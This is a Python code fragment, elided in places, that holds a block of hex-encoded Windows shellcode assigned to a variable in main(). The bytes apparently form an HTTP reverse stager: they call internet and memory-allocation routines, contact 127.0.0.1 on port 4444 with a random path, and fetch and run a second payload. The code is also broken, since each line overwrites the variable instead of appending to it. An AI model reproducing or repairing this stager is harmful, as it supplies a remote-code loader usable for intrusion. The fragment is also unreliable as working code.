...
def main():
    ...
    outCode = b"\x53\x53\x68\x5c\x11\x00\x00\xe8\x9c\x00\x00\x00\x2f\x47\x6a"
    outCode = b"\x66\x72\x39\x36\x6a\x42\x67\x31\x59\x37\x5a\x54\x70\x6b\x5a"
    outCode = b"\x4d\x66\x33\x70\x51\x59\x4b\x5a\x50\x43\x56\x51\x5a\x74\x00"
    outCode = b"\x50\x68\x57\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00\x02\x60"
    outCode = b"\x84\x53\x53\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff\xd5\x96"
    outCode = b"\x6a\x0a\x5f\x53\x53\x53\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5"
    outCode = b"\x85\xc0\x75\x14\x68\x88\x13\x00\x00\x68\x44\xf0\x35\xe0\xff"
    outCode = b"\xd5\x4f\x75\xe1\xe8\x46\x00\x00\x00\x6a\x40\x68\x00\x10\x00"
    outCode = b"\x00\x68\x00\x00\x40\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93"
    outCode = b"\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96"
    outCode = b"\x89\xe2\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01\xc3\x85\xc0\x75"
    outCode = b"\xe5\x58\xc3\x5f\xe8\x7f\xff\xff\xff\x31\x32\x37\x2e\x30\x2e"
    outCode = b"\x30\x2e\x31\x00\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
